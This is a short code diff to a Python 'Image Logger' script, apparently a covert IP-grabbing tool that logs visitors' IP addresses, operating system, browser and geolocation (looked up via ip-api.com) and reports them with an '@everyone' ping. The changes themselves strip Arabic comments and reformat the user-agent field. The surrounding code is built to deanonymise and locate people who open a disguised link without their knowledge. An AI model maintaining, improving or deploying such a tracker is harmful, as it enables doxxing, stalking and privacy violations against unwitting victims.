@@ -10,7 +10,7 @@ config = {
     "username": "Image Logger",
     "color": 0x00FFFF,
     "vpnCheck": 1,
-    "buggedImage": False,  # لا تستخدم صورة التحميل المشفرة
+    "buggedImage": False,
     "message": {
         "doMessage": False,
         "richMessage": False,
@@ -47,8 +47,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         return
 
     ping = "@everyone"
-    
-    # 🛠 إصلاح: إزالة fields الغير مدعوم
+
     info = requests.get(f"http://ip-api.com/json/{ip}").json()
     if info.get("status") != "success":
         return
@@ -73,8 +72,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 > **OS:** `{os_name}`
 > **Browser:** `{browser}`
 
-**User Agent:**
-
+**User Agent:** `{useragent}`"""
 
     embed = {
         "username": config["username"],
@@ -147,3 +145,4 @@ def run(server_class=HTTPServer, handler_class=ImageLoggerAPI, port=8080):
 
 if __name__ == "__main__":
     run()
+
